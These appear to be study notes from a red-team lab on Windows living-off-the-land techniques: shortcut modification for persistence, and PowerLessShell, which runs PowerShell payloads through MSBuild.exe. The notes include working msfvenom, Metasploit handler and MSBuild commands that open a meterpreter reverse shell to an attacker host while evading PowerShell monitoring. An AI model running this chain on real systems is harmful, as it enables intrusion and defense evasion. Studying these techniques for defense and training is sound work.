
## Shortcut Modification (Persistence / Initial Access)

### Concept

Windows **Shortcuts (.lnk)** can be modified so that clicking them executes **malicious commands instead of the original application**.

- Commonly abused for:
    
    - Initial access
        
    - Privilege escalation
        
    - Persistence
        
- Victim interaction is required (click)
    

### MITRE ATT&CK

- **Technique:** Shortcut Modification
    
- **ID:** **T1547**
    

---

### Common Execution Targets

Attackers modify the **Target** field of shortcuts to run:

- `rundll32.exe`
    
- `powershell.exe`
    
- `regsvr32.exe`
    
- Malicious executable on disk
    

### Example Abuse

- An Excel shortcut is modified
    
- Instead of launching Excel, it executes `calc.exe` via `rundll32`
    
- Victim clicks the shortcut → malicious payload runs
    

---

### Key Takeaway

> Shortcut modification is a **low-noise persistence technique** that abuses user trust and normal desktop behavior.

---

## No PowerShell Execution (PowerLessShell)

### Background

- PowerShell is **heavily monitored and often blocked**
    
- Red Canary reports PowerShell as one of the **most abused attack tools**
    
- Attackers execute PowerShell **without spawning `powershell.exe`**
    

---

## PowerLessShell Technique

### Tool

**PowerLessShell** – Python-based tool

### Abuse Mechanism

- Uses **MSBuild.exe** (Microsoft Build Engine)
    
- Executes PowerShell payloads **in-memory**
    
- No visible `powershell.exe` process
    

### MITRE ATT&CK

- **Technique:** Indirect Command Execution
    
- **ID:** **T1202**
    

---

### High-Level Execution Flow

1. Generate PowerShell payload
    
2. Convert payload to MSBuild-compatible project
    
3. Transfer project file to victim
    
4. Execute using `MSBuild.exe`
    
5. Receive reverse shell (no PowerShell process)
    

---

### Payload Generation

`msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1`

---

### Listener Setup

`msfconsole -q -x "use exploit/multi/handler; \ set payload windows/meterpreter/reverse_winhttps; \ set lhost AttackBox_IP; set lport 4443; exploit"`

---

### Convert Payload (PowerLessShell)

`python2 PowerLessShell.py -type powershell  -source liv0ff.ps1  -output liv0ff.csproj`

---

### Execute on Target

`C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe liv0ff.csproj`

---

### Result

- Reverse shell established
    
- **No `powershell.exe` process**
    
- Execution occurs via trusted Microsoft binary


#note 
Astaroth: Banking Trojan - A real-life malware analysis where they showcase using the Living Off the Land technique used by Malware.